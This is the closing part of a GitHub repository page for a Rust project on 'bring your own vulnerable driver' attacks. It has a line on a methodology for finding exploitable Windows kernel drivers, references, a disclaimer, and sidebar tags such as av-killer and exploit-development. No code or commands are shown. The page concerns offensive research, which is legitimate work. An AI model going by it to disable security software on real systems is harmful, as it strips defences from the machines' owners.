> This methodology demonstrates how to systematically reverse engineer any Windows x64 kernel driver to identify similar vulnerabilities by following the execution path from user-mode communication through to dangerous kernel operations.

## Support üç∫

[Permalink: Support üç∫](https://github.com/BlackSnufkin/BYOVD#support-)

If BYOVD helped your red team operations, consider buying me a beer:

[![](https://camo.githubusercontent.com/0cf29a542375e1a46e84d8bf5805a4e5c0a6ee98b6547ccdc0c55eed49d99c69/68747470733a2f2f63646e2e6275796d6561636f666665652e636f6d2f627574746f6e732f76322f64656661756c742d79656c6c6f772e706e67)](https://www.buymeacoffee.com/blacksnufkin)

## üîó References

[Permalink: üîó References](https://github.com/BlackSnufkin/BYOVD#-references)

- **Alice Climent-Pommeret's Blog**: [Finding and Exploiting Process Killer Drivers with LOL for $3000](https://alice.climent-pommeret.red/posts/process-killer-driver/)
- **LOLDrivers**: [A Central Repository of Known Vulnerable Drivers](https://www.loldrivers.io/)
- **Microsoft Driver Block Rules**: [Microsoft's Recommended Driver Block Rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)
- **Windows Kernel Programming** by Pavel Yosifovich
- **Windows Internals, Part 1 & 2** by Mark E. Russinovich, Alex Ionescu, David Solomon

## ‚ö†Ô∏è Disclaimer

[Permalink: ‚ö†Ô∏è Disclaimer](https://github.com/BlackSnufkin/BYOVD#%EF%B8%8F-disclaimer)

**The BYOVD Project** is for **educational and research purposes only**. The author is not responsible for any misuse or damage caused by these programs. Always seek explicit permission before using these tools on any system.

## About

BYOVD research use cases featuring vulnerable driver discovery and reverse engineering methodology. (CVE-2025-52915, CVE-2025-1055,).


### Topics

[rust](https://github.com/topics/rust "Topic: rust") [malware-development](https://github.com/topics/malware-development "Topic: malware-development") [redteam](https://github.com/topics/redteam "Topic: redteam") [exploit-development](https://github.com/topics/exploit-development "Topic: exploit-development") [byovd](https://github.com/topics/byovd "Topic: byovd") [vulnerable-driver](https://github.com/topics/vulnerable-driver "Topic: vulnerable-driver") [av-killer](https://github.com/topics/av-killer "Topic: av-killer") [loldrivers](https://github.com/topics/loldrivers "Topic: loldrivers")

### Resources

[Readme](https://github.com/BlackSnufkin/BYOVD#readme-ov-file)

### License

[GPL-3.0 license](https://github.com/BlackSnufkin/BYOVD#GPL-3.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/BlackSnufkin/BYOVD).

[Activity](https://github.com/BlackSnufkin/BYOVD/activity)

### Stars

[**575**\\
stars](https://github.com/BlackSnufkin/BYOVD/stargazers)

### Watchers

[**16**\\
watching](https://github.com/BlackSnufkin/BYOVD/watchers)

### Forks

[**89**\\
forks](https://github.com/BlackSnufkin/BYOVD/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FBlackSnufkin%2FBYOVD&report=BlackSnufkin+%28user%29)

## [Releases](https://github.com/BlackSnufkin/BYOVD/releases)

No releases published

## [Packages\  0](https://github.com/users/BlackSnufkin/packages?repo_name=BYOVD)

No packages published

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/BlackSnufkin/BYOVD).

## [Contributors\  2](https://github.com/BlackSnufkin/BYOVD/graphs/contributors)

- [![@BlackSnufkin](https://avatars.githubusercontent.com/u/61916899?s=64&v=4)](https://github.com/BlackSnufkin)[**BlackSnufkin** BlackSnufkin](https://github.com/BlackSnufkin)
- [![@wwwab123](https://avatars.githubusercontent.com/u/94147274?s=64&v=4)](https://github.com/wwwab123)[**wwwab123** wwwab](https://github.com/wwwab123)

## Languages

- [Rust100.0%](https://github.com/BlackSnufkin/BYOVD/search?l=rust)

You can‚Äôt perform that action at this time.